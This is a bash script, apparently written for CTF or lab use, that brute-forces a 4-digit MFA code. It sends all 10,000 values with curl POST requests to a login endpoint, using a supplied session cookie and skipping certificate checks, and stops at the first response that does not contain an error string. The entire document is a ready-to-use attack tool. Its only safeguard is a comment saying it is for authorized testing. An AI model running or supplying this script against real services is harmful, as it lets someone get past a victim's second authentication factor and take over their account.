#!/bin/bash

# ===================================================================================================
# MFA  Brute Force Helper
# ===================================================================================================
#
# Description:
# This script automatically tests 4-digit MFA codes
# from 0000 to 9999 by sending HTTP POST requests
# using curl.
#
# Intended use:
# Authorized security testing environments only,
# such as personal labs or CTF platforms.
#
# ====================================================================================================


# Target MFA verification endpoint. Change this URL according to your authorized target
URL="https://target-website.com/login"


# Cookie obtained after authentication. Replace this value with your own  cookie
COOKIE="your-cookie"






# Generate all possible 4-digit MFA codes
#
# The option "-w" keeps the leading zeros

for code in $(seq -w 0 9999)
do

    # Display the current code being tested
    echo "[*] Testing MFA code: $code"

    # Send the POST request to the MFA endpoint
    #
    # -s : Silent mode (hide curl progress)
    # -k : Ignore SSL certificate validation
    # -X POST : Use HTTP POST method
    # --data : Send the MFA code parameter

    response=$(curl -s -k \
        -X POST "$URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $COOKIE" \
        --data "mfa-code=$code")


    # Check the server response
    #
    # The word "Incorrect" is an example. You may need to change it depending on the application's error message.
    #
    # If "Incorrect" is found, the code is invalid and the script continues with the next value.

    if echo "$response" | grep -q "Incorrect"
    then

        continue

    else

        # A different response was received.
        # This may indicate a valid MFA code.

        echo "[+] Possible valid MFA code found: $code"


        # Save the server response for manual analysis

        echo "$response" > success_response.html


        # Stop the brute force process

        break

    fi

done


echo "[*] Finished testing MFA codes"
